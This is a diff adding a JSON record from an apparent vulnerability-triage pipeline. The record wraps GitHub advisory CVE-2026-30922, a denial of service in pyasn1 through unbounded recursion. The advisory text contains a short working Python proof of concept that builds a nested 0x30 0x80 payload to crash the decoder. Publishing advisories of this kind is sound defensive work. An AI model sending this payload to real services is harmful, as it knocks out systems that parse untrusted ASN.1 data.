@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/259386329?v=4\", \"events_url\": \"https://api.github.com/users/romanticpragmatism/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/romanticpragmatism/followers\", \"following_url\": \"https://api.github.com/users/romanticpragmatism/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/romanticpragmatism/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/romanticpragmatism\", \"id\": 259386329, \"login\": \"romanticpragmatism\", \"node_id\": \"U_kgDOD3Xr2Q\", \"organizations_url\": \"https://api.github.com/users/romanticpragmatism/orgs\", \"received_events_url\": \"https://api.github.com/users/romanticpragmatism/received_events\", \"repos_url\": \"https://api.github.com/users/romanticpragmatism/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/romanticpragmatism/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/romanticpragmatism/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/romanticpragmatism\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-30922\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-674\", \"name\": \"Uncontrolled Recursion\"}], \"description\": \"### Summary\\nThe `pyasn1` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing nested `SEQUENCE` (`0x30`) or `SET` (`0x31`) tags with Indefinite Length (`0x80`) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a `RecursionError` or consumes all available memory (OOM), crashing the host application.\\n\\n### Details\\nThe vulnerability exists because the decoder iterates through the input stream and recursively calls `decodeFun` (the decoding callback) for every nested component found, without tracking or limiting the recursion depth.\\nVulnerable Code Locations:\\n1. `indefLenValueDecoder` (Line 998):\\n```for component in decodeFun(substrate, asn1Spec, allowEoo=True, **options):```\\nThis method handles indefinite-length constructed types. It sits inside a `while True` loop and recursively calls the decoder for every nested tag.\\n\\n2. `valueDecoder` (Lines 786 and 907):\\n```for component in decodeFun(substrate, componentType, **options):```\\nThis method handles standard decoding when a schema is present. It contains two distinct recursive calls that lack depth checks: Line 786: Recursively decodes components of `SEQUENCE` or `SET` types. Line 907: Recursively decodes elements of `SEQUENCE OF` or `SET OF` types.\\n\\n4. `_decodeComponentsSchemaless` (Line 661):\\n```for component in decodeFun(substrate, **options):```\\nThis method handles decoding when no schema is provided.\\n\\nIn all three cases, `decodeFun` is invoked without passing a `depth` parameter or checking against a global `MAX_ASN1_NESTING` limit.\\n\\n### PoC\\n```\\nimport sys\\nfrom pyasn1.codec.ber import decoder\\n\\nsys.setrecursionlimit(100000)\\n\\nprint(\\\"[*] Generating Recursion Bomb Payload...\\\")\\ndepth = 50_000\\nchunk = b'\\\\x30\\\\x80' \\npayload = chunk * depth\\n\\nprint(f\\\"[*] Payload size: {len(payload) / 1024:.2f} KB\\\")\\nprint(\\\"[*] Triggering Decoder...\\\")\\n\\ntry:\\n    decoder.decode(payload)\\nexcept RecursionError:\\n    print(\\\"[!] Crashed: Recursion Limit Hit\\\")\\nexcept MemoryError:\\n    print(\\\"[!] Crashed: Out of Memory\\\")\\nexcept Exception as e:\\n    print(f\\\"[!] Crashed: {e}\\\")\\n```\\n\\n```\\n[*] Payload size: 9.77 KB\\n[*] Triggering Decoder...\\n[!] Crashed: Recursion Limit Hit\\n```\\n\\n### Impact\\n- This is an unhandled runtime exception that typically terminates the worker process or thread handling the request. This allows a remote attacker to trivially kill service workers with a small payload (<100KB), resulting in a Denial of Service. Furthermore, in environments where recursion limits are increased, this leads to server-wide memory exhaustion.\\n- Service Crash: Any service using `pyasn1` to parse untrusted ASN.1 data (e.g., LDAP, SNMP, Kerberos, X.509 parsers) can be crashed remotely.\\n- Resource Exhaustion: The attack consumes RAM linearly with the nesting depth. A small payload (<200KB) can consume hundreds of megabytes of RAM or exhaust the stack.\\n\\n### Credits\\nVulnerability discovered by Kevin Tu of TMIR at ByteDance.\", \"epss\": {\"percentage\": 0.00803, \"percentile\": 0.52518}, \"ghsa_id\": \"GHSA-jr27-m4p2-rc6r\", \"github_reviewed_at\": \"2026-03-17T16:17:33Z\", \"html_url\": \"https://github.com/advisories/GHSA-jr27-m4p2-rc6r\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jr27-m4p2-rc6r\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-30922\"}], \"nvd_published_at\": \"2026-03-18T04:17:18Z\", \"published_at\": \"2026-03-17T16:17:33Z\", \"references\": [\"https://github.com/pyasn1/pyasn1/security/advisories/GHSA-jr27-m4p2-rc6r\", \"https://github.com/pyasn1/pyasn1/commit/5a49bd1fe93b5b866a1210f6bf0a3924f21572c8\", \"https://github.com/pyasn1/pyasn1/releases/tag/v0.6.3\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-30922\", \"https://github.com/pyasn1/pyasn1/commit/25ad481c19fdb006e20485ef3fc2e5b3eff30ef0\", \"http://www.openwall.com/lists/oss-security/2026/03/20/4\", \"https://lists.debian.org/debian-lts-announce/2026/05/msg00001.html\", \"https://github.com/advisories/GHSA-jr27-m4p2-rc6r\"], \"repository_advisory_url\": \"https://api.github.com/repos/pyasn1/pyasn1/security-advisories/GHSA-jr27-m4p2-rc6r\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/pyasn1/pyasn1\", \"summary\": \"Denial of Service in pyasn1 via Unbounded Recursion\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-01T18:31:19Z\", \"url\": \"https://api.github.com/advisories/GHSA-jr27-m4p2-rc6r\", \"vulnerabilities\": [{\"first_patched_version\": \"0.6.3\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyasn1\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.6.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jr27-m4p2-rc6r",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyasn1: <= 0.6.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-30922"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyasn1"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.189156Z",
+  "provenance": {
+    "content_sha256": "6835c4356d07ffaf549d758ed59f13fdb34f59c40f91482ac79d4fa12042e9b0",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-03-17T16:17:33Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jr27-m4p2-rc6r",
+  "status": "active",
+  "title": "Denial of Service in pyasn1 via Unbounded Recursion",
+  "updated_at": "2026-05-01T18:31:19Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jr27-m4p2-rc6r"
+}
